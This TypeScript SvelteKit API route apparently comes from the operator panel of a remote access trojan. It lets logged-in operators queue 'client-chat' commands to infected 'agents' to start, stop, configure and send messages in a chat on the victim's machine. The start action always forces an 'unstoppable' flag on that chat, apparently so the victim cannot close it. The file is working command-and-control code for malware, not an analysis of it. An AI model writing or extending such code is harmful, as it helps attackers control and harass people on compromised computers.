import { randomUUID } from 'crypto';
import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import { clientChatManager, ClientChatError } from '$lib/server/rat/client-chat';
import type {
	ClientChatAliasConfiguration,
	ClientChatCommandPayload,
	ClientChatFeatureFlags,
	ClientChatMessageResponse,
	ClientChatStateResponse
} from '$lib/types/client-chat';

type StartChatRequest = {
	action: 'start';
	sessionId?: string;
	aliases?: ClientChatAliasConfiguration;
	features?: Partial<ClientChatFeatureFlags>;
};

type StopChatRequest = {
	action: 'stop';
	sessionId?: string;
};

type SendMessageRequest = {
	action: 'send-message';
	sessionId?: string;
	message: {
		id?: string;
		body: string;
		timestamp?: string;
	};
	aliases?: ClientChatAliasConfiguration;
};

type ConfigureChatRequest = {
	action: 'configure';
	sessionId?: string;
	aliases?: ClientChatAliasConfiguration;
	features?: Partial<ClientChatFeatureFlags>;
};

type ChatActionRequest =
	| StartChatRequest
	| StopChatRequest
	| SendMessageRequest
	| ConfigureChatRequest;

function ensureAgentId(paramsId: string | undefined): string {
	if (!paramsId) {
		throw error(400, 'Missing agent identifier');
	}
	return paramsId;
}

function queueChatCommand(agentId: string, payload: ClientChatCommandPayload, operatorId: string) {
	try {
		registry.queueCommand(agentId, { name: 'client-chat', payload }, { operatorId });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue chat command');
	}
}

function normalizeAliases(
	aliases: ClientChatAliasConfiguration | undefined,
	fallback: { operator: string; client: string }
): ClientChatAliasConfiguration {
	const resolved: ClientChatAliasConfiguration = {
		operator: aliases?.operator ?? fallback.operator,
		client: aliases?.client ?? fallback.client
	};
	return resolved;
}

function normalizeFeatures(
        features: Partial<ClientChatFeatureFlags> | undefined,
        options: { forceUnstoppable?: boolean } = {}
): Partial<ClientChatFeatureFlags> | undefined {
        const normalized: Partial<ClientChatFeatureFlags> = { ...(features ?? {}) };
        const shouldForce = options.forceUnstoppable === true;
        if (shouldForce) {
                normalized.unstoppable = true;
        }
        if (Object.keys(normalized).length === 0) {
                return undefined;
        }
	return normalized;
}

export const GET: RequestHandler = ({ params, locals }) => {
	const agentId = ensureAgentId(params.id);
	requireViewer(locals.user);
	const session = clientChatManager.getState(agentId);
	const response: ClientChatStateResponse = { session };
	return json(response);
};

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const agentId = ensureAgentId(params.id);
	const user = requireOperator(locals.user);

	let payload: ChatActionRequest;
	try {
		payload = (await request.json()) as ChatActionRequest;
	} catch {
		throw error(400, 'Invalid chat action payload');
	}

	if (!payload || typeof payload !== 'object' || !('action' in payload)) {
		throw error(400, 'Chat action is required');
	}

	switch (payload.action) {
		case 'start': {
			const current = clientChatManager.getState(agentId);
			const sessionId = payload.sessionId?.trim() || current?.sessionId || randomUUID();
			const aliases = normalizeAliases(payload.aliases, {
				operator: current?.operatorAlias ?? 'Operator',
				client: current?.clientAlias ?? 'Client'
			});
			const features = normalizeFeatures(payload.features, { forceUnstoppable: true });
			queueChatCommand(
				agentId,
				{
					action: 'start',
					sessionId,
					aliases,
					features
				},
				user.id
			);
			try {
				const session = clientChatManager.ensureSession(agentId, {
					sessionId,
					aliases,
					features
				});
				const response: ClientChatStateResponse = { session };
				return json(response);
			} catch (err) {
				if (err instanceof ClientChatError) {
					throw error(err.status, err.message);
				}
				throw error(500, 'Failed to start chat session');
			}
		}
		case 'stop': {
			const current = clientChatManager.getState(agentId);
			if (!current) {
				const response: ClientChatStateResponse = { session: null };
				return json(response);
			}
			const sessionId = payload.sessionId?.trim() || current.sessionId;
			queueChatCommand(agentId, { action: 'stop', sessionId }, user.id);
			try {
				const session = clientChatManager.stopSession(agentId, sessionId);
				const response: ClientChatStateResponse = { session };
				return json(response);
			} catch (err) {
				if (err instanceof ClientChatError) {
					throw error(err.status, err.message);
				}
				throw error(500, 'Failed to stop chat session');
			}
		}
		case 'send-message': {
			const messageBody = payload.message?.body?.trim();
			if (!messageBody) {
				throw error(400, 'Message body is required');
			}
			const current = clientChatManager.getState(agentId);
			if (!current || !current.active) {
				throw error(409, 'Chat session is not active');
			}
			const sessionId = payload.sessionId?.trim() || current.sessionId;
			const messageId = payload.message.id?.trim() || randomUUID();
			const timestamp = payload.message.timestamp?.trim() || new Date().toISOString();
			const aliases = normalizeAliases(payload.aliases, {
				operator: current.operatorAlias,
				client: current.clientAlias
			});
			queueChatCommand(
				agentId,
				{
					action: 'send-message',
					sessionId,
					message: {
						id: messageId,
						body: messageBody,
						timestamp
					},
					aliases
				},
				user.id
			);
			try {
				const result = clientChatManager.sendOperatorMessage(agentId, {
					sessionId,
					id: messageId,
					body: messageBody,
					timestamp,
					alias: aliases.operator
				});
				if (payload.aliases) {
					clientChatManager.configureSession(agentId, {
						sessionId,
						aliases
					});
					const session = clientChatManager.getState(agentId);
					const response: ClientChatMessageResponse = {
						accepted: result.accepted,
						session: session ?? result.session,
						message: result.message
					};
					return json(response);
				}
				const response: ClientChatMessageResponse = result;
				return json(response);
			} catch (err) {
				if (err instanceof ClientChatError) {
					throw error(err.status, err.message);
				}
				throw error(500, 'Failed to dispatch chat message');
			}
		}
                case 'configure': {
                        const current = clientChatManager.getState(agentId);
                        const sessionId = payload.sessionId?.trim() || current?.sessionId || randomUUID();
                        const aliases = normalizeAliases(payload.aliases, {
                                operator: current?.operatorAlias ?? 'Operator',
                                client: current?.clientAlias ?? 'Client'
                        });
                        const features = normalizeFeatures(payload.features);
			queueChatCommand(
				agentId,
				{
					action: 'configure',
					sessionId,
					aliases,
					features
				},
				user.id
			);
			try {
				const session = clientChatManager.configureSession(agentId, {
					sessionId,
					aliases,
					features
				});
				const response: ClientChatStateResponse = { session };
				return json(response);
			} catch (err) {
				if (err instanceof ClientChatError) {
					throw error(err.status, err.message);
				}
				throw error(500, 'Failed to configure chat session');
			}
		}
		default:
			throw error(400, 'Unsupported chat action');
	}
};
